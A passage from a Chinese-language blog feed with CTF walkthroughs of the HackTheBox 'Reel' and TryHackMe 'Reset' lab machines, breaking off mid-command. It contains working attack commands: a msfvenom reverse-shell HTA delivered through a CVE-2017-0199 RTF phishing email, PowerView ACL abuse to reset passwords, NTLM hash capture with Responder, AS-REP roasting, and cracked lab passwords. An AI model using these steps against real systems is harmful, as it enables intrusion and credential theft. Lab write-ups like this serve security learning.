ftpd</span><br><span class="line">| ftp-syst:</span><br><span class="line">|_  SYST: Windows_NT</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_05-28-18  11:19PM       &lt;DIR&gt;          documents</span><br><span class="line">22/tcp    open  ssh          OpenSSH 7.6 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 82:20:c3:bd:16:cb:a2:9c:88:87:1d:6c:15:59:ed:ed (RSA)</span><br><span class="line">|   256 23:2b:b8:0a:8c:1c:f4:4d:8d:7e:5e:64:58:80:33:45 (ECDSA)</span><br><span class="line">|_  256 ac:8b:de:25:1d:b7:d8:38:38:9b:9c:16:bf:f6:3f:ed (ED25519)</span><br><span class="line">25/tcp    open  smtp?</span><br><span class="line">| smtp-commands: REEL, SIZE 20480000, AUTH LOGIN PLAIN, HELP</span><br><span class="line">|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Kerberos, LDAPBindReq, LDAPSearchReq, LPDString, NULL, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, X11Probe:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, RTSPRequest:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|   Hello:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     EHLO Invalid domain address.</span><br><span class="line">|   Help:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY</span><br><span class="line">|   SIPOptions:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|     sequence of commands</span><br><span class="line">|   TerminalServerCookie:</span><br><span class="line">|     220 Mail Service ready</span><br><span class="line">|_    sequence of commands</span><br><span class="line">135/tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds Windows Server 2012 R2 Standard 9600 microsoft-ds (workgroup: HTB)</span><br><span class="line">593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49159/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="line">...</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: specialized</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 7 (85%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_7</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Embedded Standard 7 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb-os-discovery:</span><br><span class="line">|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)</span><br><span class="line">|   OS CPE: cpe:/o:microsoft:windows_server_2012::-</span><br><span class="line">|   Computer name: REEL</span><br><span class="line">|   NetBIOS computer name: REEL\x00</span><br><span class="line">|   Domain name: HTB.LOCAL</span><br><span class="line">|   Forest name: HTB.LOCAL</span><br><span class="line">|   FQDN: REEL.HTB.LOCAL</span><br><span class="line">|_  System time: 2024-10-27T05:48:32+00:00</span><br><span class="line">| smb-security-mode:</span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-27T05:48:28</span><br><span class="line">|_  start_date: 2024-10-27T05:35:31</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:0:2:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 2s, deviation: 3s, median: 0s</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 445/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   644.73 ms 10.10.16.1</span><br><span class="line">2   961.24 ms 10.10.10.77</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 263.65 seconds</span><br></pre></td></tr></table></figure><p>开放21，22，25等若干端口，同时通过脚本扫描结果可知，该域名是<code>REEL.HTB.LOCAL</code>和<code>HTB.LOCAL</code>，将其添加到<code>/etc/hosts</code>文件中</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135321701-294670808.png" alt="image-20241027135319436"></p><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>从扫描结果可知，ftp是允许匿名登录的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ftp anonymous@10.10.10.77</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135531142-1779717189.png" alt="image-20241027135528981"></p><p>发现三个文件，全部下载下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">prompt off</span><br><span class="line">mget *</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135724047-432466087.png" alt="image-20241027135721726"></p><p>全部查看一下</p><ul><li>readme.txt</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027135939835-2118791.png" alt="image-20241027135937958"></p><p>发现是要使用邮件发送rtf格式的文件，并且文档都会保存到这里</p><ul><li>AppLocker.docx</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027140116875-11898502.png" alt="image-20241027140115107"></p><ul><li>Windows Event Forwarding.docx</li></ul><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027140535714-592406716.png" alt="image-20241027140533430"></p><p>打开后发现文件已经损坏，使用<code>exiftool</code>检查数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exiftool Windows\ Event\ Forwarding.docx</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027140726612-828137712.png" alt="image-20241027140724359"></p><p>找到了个邮箱<code>nico@megabank.com</code></p><h1 id="RTF钓鱼"><a href="#RTF钓鱼" class="headerlink" title="RTF钓鱼"></a>RTF钓鱼</h1><p>漏洞链接：<a href="https://nvd.nist.gov/vuln/detail/CVE-2017-0199">CVE-2017-0199</a></p><p>使用<code>msfvenom</code>生成一个HTA文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=8888 -f hta-psh -o shell.hta</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027142449226-1612502237.png" alt="image-20241027142446919"></p><p>使用<a href="https://github.com/bhdresh/CVE-2017-0199">CVE-2017-0199</a>中的脚本创建一个RTF文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 CVE-2017-0199/cve-2017-0199_toolkit.py -M gen -w shell.rtf -u http://10.10.16.4/shell.hta -t rtf -x 0</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027142911589-1627462942.png" alt="image-20241027142909573"></p><p>先启动一个http服务，在准备一个nc监听</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027143033400-71778760.png" alt="image-20241027143031493"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027143041473-540171105.png" alt="image-20241027143039426"></p><p>使用<code>sendemail</code>发送邮件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sendEmail -f root@admin.com -t nico@megabank.com -u <span class="string">&quot;look me&quot;</span> -m <span class="string">&quot;click me&quot;</span> -a shell.rtf -s 10.10.10.77 -v</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027143939282-234032504.png" alt="image-20241027143936622"></p><p>大约等待30s左右，就获得到shell了</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027144231417-1596098132.png" alt="image-20241027144229331"></p><p>找到<code>user.txt</code></p><h1 id="nico-gt-Tom"><a href="#nico-gt-Tom" class="headerlink" title="nico -&gt; Tom"></a>nico -&gt; Tom</h1><p>在<code>nico</code>桌面上发现还有个<code>cred.xml</code>，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027144606786-1891749689.png" alt="image-20241027144604507"></p><p>发现是<code>tom</code>的用户名和密码</p><p>可以使用<code>Powershell</code>的<code>PSCredential</code>，它提供了一种存储用户名、密码和凭据的方法。还有两个函数<code>Import-CliXml</code>和<code>Export-CliXml</code> ，用于将这些凭据保存到文件中以及从文件中恢复它们。</p><p>使用<code>Import-CliXml</code>加载文件来获取明文密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c <span class="string">&quot;<span class="variable">$cred</span> = Import-CliXml -Path cred.xml; <span class="variable">$cred</span>.GetNetworkCredential() | Format-List *&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145028630-177734907.png" alt="image-20241027145026052"></p><p>获取到<code>Tom</code>用户的明文密码<code>1ts-mag1c!!!</code></p><p>尝试使用ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh tom@10.10.10.77</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145337858-1210501876.png" alt="image-20241027145335727"></p><h1 id="AD-Privesc"><a href="#AD-Privesc" class="headerlink" title="AD Privesc"></a>AD Privesc</h1><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145617853-1021058284.png" alt="image-20241027145615560"></p><p>注意到桌面上有个<code>AD Audit</code>目录</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145705349-1312903517.png" alt="image-20241027145703246"></p><p>先查看一下<code>note.txt</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027145804355-665684367.png" alt="image-20241027145802362"></p><p>查看一下其他文件</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027150322032-1642287028.png" alt="image-20241027150319779"></p><p>结合提示并实践后发现，运行不了<code>SharpHound.exe</code>，无法使用<code>Bloodhound</code>进行信息收集，所以我们目标放在<code>acls.csv</code>上</p><p>使用<code>scp</code>将文件下载下来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp Tom@10.10.10.77:<span class="string">&#x27;/Users/tom/Desktop/AD Audit/BloodHound/Ingestors/acls.csv&#x27;</span> ./</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027150858200-1795280760.png" alt="image-20241027150855646"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027151056577-147523502.png" alt="image-20241027151054397"></p><p>是一个<code>ACL</code>的文件，分析一下，先对<code>PrincipalName</code>简单筛选一下<code>Tom</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027151304099-1184542152.png" alt="image-20241027151302192"></p><p>发现<code>Tom</code>对<code>claire</code>有<code>WriteOwner</code>权限，在搜索一下<code>claire</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027151757888-1784963385.png" alt="image-20241027151756078"></p><p>发现<code>claire</code>对<code>Backup_Admins</code>组有<code>WriteDacl</code>权限</p><h1 id="Tom-gt-claire"><a href="#Tom-gt-claire" class="headerlink" title="Tom-&gt;claire"></a>Tom-&gt;claire</h1><p>注意到之前在<code>tom</code>机器上有<code>PowerView.ps1</code></p><p>所以我们使用<code>WriteOwner</code>权限和<code>PowerView.ps1</code>的功能来登录<code>claire</code></p><p>需要执行以下步骤：</p><ul><li>成为<code>claire</code>的ACL的所有者</li><li>获取该ACL权限</li><li>使用权限更改密码</li></ul><p>先导入<code>PowerView.ps1</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">. .\PowerView.ps1</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027152937745-1565451432.png" alt="image-20241027152935704"></p><p>先把<code>Tom</code>设置成为<code>claire</code>的ACL的所有者</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomainObjectOwner</span> <span class="literal">-identity</span> claire <span class="literal">-OwnerIdentity</span> tom</span><br></pre></td></tr></table></figure><p>给予<code>Tom</code>更改ACL上密码的权限</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> claire <span class="literal">-PrincipalIdentity</span> tom <span class="literal">-Rights</span> ResetPassword</span><br></pre></td></tr></table></figure><p>最后创建一个密码，然后给<code>claire</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pass</span> = <span class="built_in">ConvertTo-SecureString</span> <span class="string">&quot;Aa123456!&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-force</span></span><br><span class="line"><span class="built_in">Set-DomainUserPassword</span> <span class="literal">-identity</span> claire <span class="literal">-accountpassword</span> <span class="variable">$pass</span></span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027154433915-1759841619.png" alt="image-20241027154431882"></p><p>然后就可以通过ssh登录<code>claire</code>用户</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027154519928-224576146.png" alt="image-20241027154517959"></p><h1 id="claire-gt-Backup-Admins"><a href="#claire-gt-Backup-Admins" class="headerlink" title="claire-&gt;Backup_Admins"></a>claire-&gt;Backup_Admins</h1><p>之前的ACL分析可知<code>claire</code>对<code>Backup_Admins</code>组有<code>WriteDacl</code>权限，可以用它将<code>claire</code>加入该组</p><p>先查看一下<code>Backup_Admins</code>组</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group backup_admins</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027155028571-432531593.png" alt="image-20241027155026424"></p><p>当前用户只有<code>ranj</code></p><p>现在添加<code>claire</code></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group backup_admins claire /add</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027155115663-1003890863.png" alt="image-20241027155113754"></p><p>再查看一下<code>Backup_Admins</code>组</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> group backup_admins</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027155143258-1109182793.png" alt="image-20241027155141343"></p><p>发现已经<code>claire</code>在<code>Backup_Admins</code>组中了，重新登录使其生效</p><p><strong>ps: 重新登陆没有成功的，需要在执行一遍 Tom-&gt;claire 的操作</strong></p><h1 id="Backup-Admins-gt-Administrator"><a href="#Backup-Admins-gt-Administrator" class="headerlink" title="Backup_Admins-&gt;Administrator"></a>Backup_Admins-&gt;Administrator</h1><p>目前我们以<code>claire</code>身份登录，并是<code>Backup_Admins</code>组的成员</p><p>说明我们有查看<code>Administrator</code>文件的权限</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027160444426-963998426.png" alt="image-20241027160442280"></p><p>找到<code>root.txt</code>，但是我们没权限查看，注意到有个<code>Backuo Scripts</code>目录，查看一下</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027160633334-1179167874.png" alt="image-20241027160630997"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027160743097-1088951995.png" alt="image-20241027160741004"></p><p>最后在<code>BackupScript.ps1</code>文件中找到<code>Admin</code>的密码<code>Cr4ckMeIfYouC4n!</code></p><p>ssh登录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh Administrator@10.10.10.77</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027161035554-273633219.png" alt="image-20241027161033587"></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241027161109110-316346945.png" alt="image-20241027161106839"></p><p>最终找到<code>root.txt</code></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTB </tag>
            
            <tag> Windows </tag>
            
            <tag> Active Directory 101 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM-Reset</title>
      <link href="/posts/fa5fb889.html"/>
      <url>/posts/fa5fb889.html</url>
      
        <content type="html"><![CDATA[<span id="more"></span><blockquote><p>靶机ip：10.10.219.65</p></blockquote><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --min-rate 10000 -A -sV -sC -p- 10.10.219.65</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-25 13:49 CST</span><br><span class="line">Nmap scan report for 10.10.219.65</span><br><span class="line">Host is up (0.63s latency).</span><br><span class="line">Not shown: 65515 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-10-25 05:50:16Z)</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp   open  tcpwrapped</span><br><span class="line">3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: thm.corp0., Site: Default-First-Site-Name)</span><br><span class="line">3269/tcp  open  tcpwrapped</span><br><span class="line">3389/tcp  open  ms-wbt-server Microsoft Terminal Services</span><br><span class="line">| ssl-cert: Subject: commonName=HayStack.thm.corp</span><br><span class="line">| Not valid before: 2024-10-24T05:48:35</span><br><span class="line">|_Not valid after:  2025-04-25T05:48:35</span><br><span class="line">| rdp-ntlm-info:</span><br><span class="line">|   Target_Name: THM</span><br><span class="line">|   NetBIOS_Domain_Name: THM</span><br><span class="line">|   NetBIOS_Computer_Name: HAYSTACK</span><br><span class="line">|   DNS_Domain_Name: thm.corp</span><br><span class="line">|   DNS_Computer_Name: HayStack.thm.corp</span><br><span class="line">|   DNS_Tree_Name: thm.corp</span><br><span class="line">|   Product_Version: 10.0.17763</span><br><span class="line">|_  System_Time: 2024-10-25T05:51:48+00:00</span><br><span class="line">|_ssl-date: 2024-10-25T05:53:13+00:00; +22s from scanner time.</span><br><span class="line">5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">|_http-title: Not Found</span><br><span class="line">|_http-server-header: Microsoft-HTTPAPI/2.0</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49669/tcp open  unknown</span><br><span class="line">49670/tcp open  unknown</span><br><span class="line">49671/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49675/tcp open  unknown</span><br><span class="line">49703/tcp open  unknown</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">OS fingerprint not ideal because: Missing a closed TCP port so results incomplete</span><br><span class="line">No OS matches for host</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: HAYSTACK; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 21s, deviation: 0s, median: 21s</span><br><span class="line">| smb2-security-mode:</span><br><span class="line">|   3:1:1:</span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time:</span><br><span class="line">|   date: 2024-10-25T05:51:48</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3389/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   662.94 ms 10.14.0.1</span><br><span class="line">2   663.13 ms 10.10.219.65</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 249.78 seconds</span><br></pre></td></tr></table></figure><p>可以看出这是一台域控，并且域名是<code>HayStack.thm.corp</code>，将这个和<code>thm.corp</code>添加到<code>/etc/hosts</code></p><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.219.65</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135202309-1900674591.png" alt="image-20241025135138717"></p><p>尝试连接<code>Data</code>目录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.219.65/Data</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135505429-2020002712.png" alt="image-20241025135442301"></p><p>发现每次操作文件名都会变化，先将文件下载到本地查看</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135646463-1583002200.png" alt="image-20241025135623489"></p><p>找到初始密码<code>ResetMe123!</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025135729828-1298084476.png" alt="image-20241025135706715"></p><p>在另一个pdf文件中发现一组用户名密码<code>LILY ONEILL:ResetMe123!</code></p><h2 id="rpc"><a href="#rpc" class="headerlink" title="rpc"></a>rpc</h2><p><code>rpcclient -U &quot;&quot; 10.10.219.65</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025140240543-805157185.png" alt="image-20241025140217254"></p><p>并没有什么信息</p><h1 id="获取user-txt"><a href="#获取user-txt" class="headerlink" title="获取user.txt"></a>获取user.txt</h1><p>在之前进行smb探测的时候发现目录会随着每次访问，在一定时间后就会改变文件名，说明不止我们一个人在访问这个目录，所以我们可以使用工具尝试在smb中捕获另一个人的hash</p><p>使用<a href="https://github.com/Greenwolf/ntlm_theft">ntlm_theft</a>工具创建恶意文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlm_theft.py -g url -s 10.14.90.122 -f aaa</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025142209751-1923196893.png" alt="image-20241025142146578"></p><p>在攻击机上监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo responder -I tun0</span><br></pre></td></tr></table></figure><p>将生成的文件传到靶机上</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025142655232-1422163173.png" alt="image-20241025142631944"></p><p>在监听处我们就捕获到了一组hash</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025142755759-907774947.png" alt="image-20241025142732867"></p><p>将其保存到<code>hash</code>文件，用于破解</p><p>使用<code>john</code>工具破解</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john <span class="built_in">hash</span> --wordlist=/usr/share/wordlists/rockyou.txt </span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025143503161-1529556282.png" alt="image-20241025143439961"></p><p>成功获取<code>AUTOMATE</code>的密码<code>Passw0rd1</code></p><p>尝试登录</p><p><code>evil-winrm -i 10.10.219.65 -u AUTOMATE -p Passw0rd1</code></p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025143817037-942278707.png" alt="image-20241025143753555"></p><p>在<code>Desktop</code>找到<code>user.txt</code></p><h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="AS-REP-Roasting"><a href="#AS-REP-Roasting" class="headerlink" title="AS-REP Roasting"></a>AS-REP Roasting</h2><p>使用<code>bloodhound-pytohn</code>信息收集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bloodhound-python -ns 10.10.219.65 --dns-tcp -d THM.CORP -u automate -p Passw0rd1 -c All --zip</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025144647833-553174619.png" alt="image-20241025144624398"></p><p>将收集的信息使用<code>Bloodhound</code>分析</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025150432464-189680214.png" alt="image-20241025150408916"></p><p>发现有三个能够<code>AS-REP</code>攻击的用户</p><ul><li><code>ERNESTO_SILVA@THM.CORP</code></li><li><code>TABATHA_BRITT@THM.CORP</code></li><li><code>LEANN_LONG@THM.CORP</code></li></ul><p>将用户名保存到<code>users</code>文件</p><p>使用<code>GetNPUsers.py</code>请求用户的<code>TGT</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py thm.corp/ -usersfile <span class="built_in">users</span> -dc-ip 10.10.219.65</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025151452294-1718262734.png" alt="image-20241025151428929"></p><p>分别使用<code>john</code>爆破</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202410/3051266-20241025152715817-367967576.png" alt="image-20241025152652439"></p><p>最终发现只有<code>TABATHA_BRITT</code>用户成功爆破，密码是<code>marlboro(1985)</code></p><p>再对该用户进行信息搜集</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 